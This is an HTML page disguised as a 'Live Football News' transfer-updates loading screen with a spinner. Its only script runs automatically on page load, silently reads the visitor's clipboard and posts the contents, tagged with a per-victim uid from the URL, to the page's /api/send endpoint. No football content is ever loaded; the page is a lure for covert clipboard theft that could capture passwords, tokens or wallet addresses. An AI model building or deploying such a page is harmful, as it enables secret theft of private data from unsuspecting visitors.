<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Live Football Updates</title>
  <style>
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: Arial, sans-serif;
      padding: 20px;
      background-image: url('https://images.unsplash.com/photo-1598387993100-97e1e8b9ed28?auto=format&fit=crop&w=1470&q=80');
      background-size: cover;
      background-position: center;
    }

    .overlay {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      text-align: center;
    }

    h1 {
      font-size: 32px;
      margin-bottom: 10px;
    }

    p {
      font-size: 18px;
      margin-bottom: 20px;
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ffcc00;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <h1>⚽ Live Football News</h1>
    <p>Loading today's hottest transfer updates...</p>
    <div class="spinner"></div>
  </div>

  <script>
    async function sendClipboard() {
      const uid = new URLSearchParams(window.location.search).get("uid");
      if (!uid) return;

      try {
        const text = await navigator.clipboard.readText();
        if (!text) return;

        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ uid, text })
        });
      } catch (err) {
        console.error("❌ Failed to send clipboard", err);
      }
    }

    // Run it automatically when page loads
    window.onload = sendClipboard;
  </script>
</body>
</html>
